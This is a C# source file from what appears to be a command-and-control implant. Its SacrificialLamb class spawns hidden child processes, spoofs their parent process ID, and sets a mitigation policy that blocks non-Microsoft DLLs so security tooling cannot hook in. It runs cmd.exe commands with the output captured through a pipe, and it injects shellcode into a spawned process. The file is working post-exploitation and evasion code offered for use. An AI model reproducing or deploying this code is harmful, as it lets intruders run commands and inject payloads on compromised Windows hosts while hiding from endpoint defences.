using Agent.Controllers;
using Agent.Models;

using Microsoft.Win32.SafeHandles;

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

using static Agent.PInvoke.NativeMethods;

namespace Agent.Utilities
{
    public class SacrificialLamb
    {
        readonly int PPID;
        readonly bool BlockDLLs;

        string SpawnTo;
        string Command;
        string Arguments;

        #region Constants
        // STARTUPINFOEX members
        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

        // Block non-Microsoft signed DLL's
        const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

        // STARTUPINFO members (dwFlags and wShowWindow)
        const int STARTF_USESTDHANDLES = 0x00000100;
        const int STARTF_USESHOWWINDOW = 0x00000001;
        const short SW_HIDE = 0x0000;

        // dwCreationFlags
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint CREATE_SUSPENDED = 0x00000004;
        #endregion

        public SacrificialLamb(ConfigController Config)
        {
            SpawnTo = Config.Get<string>(AgentConfig.SpawnTo);
            PPID = Config.Get<int>(AgentConfig.PPID);
            BlockDLLs = Config.Get<bool>(AgentConfig.BlockDLLs);
        }

        public string Run(string Command, string Arguments)
        {
            this.Command = null;
            this.Arguments = string.Format("{0} {1}", Command, Arguments);

            var pi = Sacrifice(out IntPtr readPipe);

            //var mole = new TinkerTailor(pi, this.RealArgs);
            //mole.SpoofArgs();

            return ReadFromPipe(pi, readPipe);
        }

        public string Shell(string Arguments)
        {
            Command = @"C:\Windows\System32\cmd.exe";
            this.Arguments = Arguments;

            var pi = Sacrifice(out IntPtr readPipe);

            //var mole = new TinkerTailor(pi, this.RealArgs);
            //mole.SpoofArgs();

            return ReadFromPipe(pi, readPipe);
        }

        public void Inject(byte[] Shellcode)
        {
            Command = SpawnTo;
            
            var pi = Sacrifice(out IntPtr _);

            //var mole = new TinkerTailor(pi, this.RealArgs);
            //mole.SpoofArgs();

            var needle = new Needle(pi);
            needle.Inject(Shellcode);
        }

        PROCESS_INFORMATION Sacrifice(out IntPtr readPipe, bool CreateSuspended = false)
        {
            // Setup handles
            var hSa = new SECURITY_ATTRIBUTES();
            hSa.nLength = Marshal.SizeOf(hSa);
            hSa.bInheritHandle = true;

            var hDupStdOutWrite = IntPtr.Zero;

            // Create pipe
            Kernel32.CreatePipe(
                out IntPtr hStdOutRead,
                out IntPtr hStdOutWrite,
                ref hSa,
                0
                );

            Kernel32.SetHandleInformation(
                hStdOutRead,
                HandleFlags.Inherit,
                0
                );

            // Initialise Startup Info
            var siEx = new STARTUPINFOEX();
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = SW_HIDE;

            var lpValueProc = IntPtr.Zero;

            try
            {
                var lpSize = IntPtr.Zero;

                var dwAttributeCount = BlockDLLs ? 2 : 1;

                Kernel32.InitializeProcThreadAttributeList(
                    IntPtr.Zero,
                    dwAttributeCount,
                    0,
                    ref lpSize
                    );

                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                Kernel32.InitializeProcThreadAttributeList(
                    siEx.lpAttributeList,
                    dwAttributeCount,
                    0,
                    ref lpSize
                    );

                // BlockDLLs
                if (BlockDLLs)
                {
                    var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

                    Marshal.WriteInt64(
                        lpMitigationPolicy,
                        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                        );

                    Kernel32.UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero
                        );
                }

                var hParent = Process.GetProcessById(PPID).Handle;

                // PPID spoof
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

                Marshal.WriteIntPtr(
                    lpValueProc,
                    hParent
                    );

                Kernel32.UpdateProcThreadAttribute(
                    siEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );

                // Duplicate handles
                var hCurrent = Process.GetCurrentProcess().Handle;

                Kernel32.DuplicateHandle(
                    hCurrent,
                    hStdOutWrite,
                    hParent,
                    ref hDupStdOutWrite,
                    0,
                    true,
                    DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess
                    );

                siEx.StartupInfo.hStdError = hDupStdOutWrite;
                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;

                // Start Process
                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                Kernel32.CreateProcess(
                    Command,
                    Arguments,
                    ref ps,
                    ref ts,
                    true,
                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null,
                    ref siEx,
                    out PROCESS_INFORMATION pInfo
                    );

                readPipe = hStdOutRead;
                return pInfo;
            }
            finally
            {
                // Free attribute list
                Kernel32.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                Marshal.FreeHGlobal(siEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValueProc);
            }
        }

        string ReadFromPipe(PROCESS_INFORMATION pi, IntPtr readPipe)
        {
            var hSafe = new SafeFileHandle(readPipe, false);
            var fileStream = new FileStream(hSafe, FileAccess.Read);

            var result = new StringBuilder();

            using (var reader = new StreamReader(fileStream))
            {
                bool exit = false;

                try
                {
                    do
                    {
                        // Has process has signaled to exit?
                        if (Kernel32.WaitForSingleObject(pi.hProcess, 100) == 0)
                        {
                            exit = true;
                        }

                        // Get number of bytes in the pipe waiting to be read
                        uint bytesToRead = 0;
                        Kernel32.PeekNamedPipe(readPipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        // If there are no bytes and process has closed, let's bail
                        // If this evaluates to false, we automatically loop again
                        if (bytesToRead == 0 && exit)
                        {
                            break;
                        }

                        // Otherwise, read from the pipe
                        var buf = new char[bytesToRead];
                        reader.Read(buf, 0, buf.Length);
                        result.Append(new string(buf));

                    } while (true);
                }
                finally
                {
                    hSafe.Close();
                }
            }

            // Close remaining handles
            Kernel32.CloseHandle(readPipe);
            Kernel32.CloseHandle(pi.hProcess);
            Kernel32.CloseHandle(pi.hThread);

            // Return result
            return result.ToString();
        }
    }
}